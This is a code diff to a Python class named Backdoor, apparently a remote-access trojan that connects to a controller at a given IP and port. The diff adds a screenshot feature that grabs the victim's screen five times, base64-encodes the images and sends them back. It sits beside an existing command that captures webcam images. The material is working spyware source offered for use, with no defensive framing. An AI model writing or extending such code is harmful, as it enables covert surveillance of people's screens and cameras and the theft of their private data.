@@ -10,6 +10,8 @@ import tempfile
 import zipfile
 import time
 import cv2
+from PIL import ImageGrab
+import io
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -118,6 +120,16 @@ class Backdoor:
         os.chdir(pwd)
         return result
     
+    def screenshot(self):
+        screenshots = []
+        for x in range(0,5):
+            ss = ImageGrab.grab()
+            buffer = io.BytesIO()
+            ss.save(buffer, format = "PNG")
+            screenshots.append(base64.b64encode(buffer.getvalue()).decode())
+            time.sleep(0.5)
+        return screenshots
+        
     def capture_image(self, n, t):
         images = []
         cam = cv2.VideoCapture(0)
@@ -162,6 +174,10 @@ class Backdoor:
                     n = int(parts[1])
                     t = int(parts[2])
                     result = self.capture_image(n, t)
+                    self.send(result)
+                    continue
+                elif command[0] == "screenshot":
+                    result = self.screenshot()
                     self.send(result)
                     continue
                 elif command[0] == "exit":
